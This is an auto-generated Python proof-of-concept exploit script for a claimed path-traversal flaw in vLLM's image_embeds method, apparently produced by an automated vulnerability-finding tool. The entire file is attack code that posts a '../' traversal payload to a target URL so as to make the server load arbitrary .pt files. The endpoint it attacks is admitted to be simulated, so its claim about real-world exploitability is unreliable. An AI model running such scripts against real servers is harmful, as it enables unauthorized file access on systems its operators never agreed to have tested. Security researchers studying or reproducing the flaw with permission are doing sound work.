#!/usr/bin/env python3
# PoC for vllm-project-vllm-7193774 (/tmp/vllm-project-vllm-7193774)
# Path: lfi-008
# Sink: download_file
# Auto-generated — run with: python3 lfi_image_embeds_method_constructs_download_file.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit script for LFI in vllm-project-vllm-7193774.

Vulnerability: The `image_embeds` method in vllm/assets/image.py constructs a
filename using attacker-controlled `self.name` without sanitization. The filename
is appended with ".pt" and then joined with a cache directory using Python's Path
operator, which allows path traversal (`../`). Consequently, an attacker can read
arbitrary `.pt` files on the filesystem by providing a payload like `../../etc/somefile`.

This script simulates an external attacker sending a crafted POST request to the
vulnerable endpoint (simulated as `/api/v1/trigger`) which passes untrusted input
to `image_embeds`. The payload uses a traversal sequence to attempt to read a
benign file outside the intended cache directory.

Usage:
    python3 exploit.py --target http://victim:8000 --payload "../../../tmp/test"

Requirements:
    - Python 3.6+
    - requests library (pip install requests)

WARNING: Only use against systems you own or have explicit permission to test.
"""

import argparse
import sys
import requests

def exploit(target_url: str, payload: str) -> None:
    """
    Send a POST request to the vulnerable endpoint with the traversal payload.

    Args:
        target_url: Base URL of the vulnerable service (e.g., http://target:8000)
        payload: Directory traversal string (without .pt extension).
                 The server will append ".pt" automatically.
    """
    # The vulnerable endpoint as described in the simulated wrapper
    endpoint = f"{target_url.rstrip('/')}/api/v1/trigger"

    # The wrapper is expected to send `self.name` = untrusted_user_input
    # We send the payload as a JSON field (adjust if form data is expected)
    data = {"input": payload}
    headers = {"Content-Type": "application/json"}

    print(f"[*] Sending POST request to {endpoint}")
    print(f"[*] Payload: {payload!r} (resulting filename: {payload}.pt)")

    try:
        response = requests.post(endpoint, json=data, headers=headers, timeout=10)
    except requests.exceptions.ConnectionError as e:
        print(f"[-] Connection error: {e}")
        sys.exit(1)
    except requests.exceptions.Timeout:
        print("[-] Request timed out.")
        sys.exit(1)
    except Exception as e:
        print(f"[-] Unexpected error: {e}")
        sys.exit(1)

    print(f"[*] HTTP Status: {response.status_code}")
    print(f"[*] Response body (first 500 chars): {response.text[:500]}")

    # Note: The server will attempt to load the resulting path via torch.load.
    # If the file does not exist or is not a valid .pt file, an error is expected.
    # This still confirms that the path traversal is evaluated and the file read
    # operation is attempted with an arbitrary path.
    if response.status_code == 200:
        print("[+] Server returned 200 – potential success (or benign error handled).")
    else:
        print("[!] Non-200 response – likely an error caused by invalid file or loading failure.")
    print("[*] Exploit attempt completed.")

def main():
    parser = argparse.ArgumentParser(
        description="LFI PoC for vllm-project-vllm-7193774"
    )
    parser.add_argument(
        "--target",
        required=True,
        help="Base URL of the vulnerable vLLM instance (e.g., http://localhost:8000)"
    )
    parser.add_argument(
        "--payload",
        default="../../../tmp/test",
        help="Path traversal payload (without .pt). Default: ../../../tmp/test"
    )
    args = parser.parse_args()

    # Sanity check: ensure payload doesn't end with .pt (the code appends it)
    if args.payload.endswith(".pt"):
        print("[!] Payload should NOT include the .pt extension; it is appended automatically.")
        sys.exit(1)

    exploit(args.target, args.payload)

if __name__ == "__main__":
    main()
